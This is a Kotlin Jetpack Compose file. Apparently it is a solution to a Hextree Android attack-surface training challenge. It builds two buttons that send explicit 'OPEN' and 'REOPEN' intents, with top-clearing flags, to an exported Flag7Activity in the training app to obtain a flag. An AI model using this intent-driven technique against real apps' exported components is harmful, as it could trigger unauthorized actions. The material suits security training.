package com.example.myapplication

import android.content.ComponentName
import android.content.Intent
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext

@Composable
fun SendIntentToGetFlag7(modifier: Modifier = Modifier) {
    val context = LocalContext.current
    Column (
        modifier = Modifier.fillMaxSize(),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ){
        Button(onClick = {
            val intent = Intent().apply {
                component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag7Activity"
                )
                action = "OPEN"
            }
            context.startActivity(intent)
        }) {
            Text("send oqpen")
        }
        Button(onClick = {
            val reopenIntent = Intent().apply {
                component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag7Activity"
                )
                action = "REOPEN"
                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            context.startActivity(reopenIntent)
        }) {
            Text("send reopen")
        }
    }
}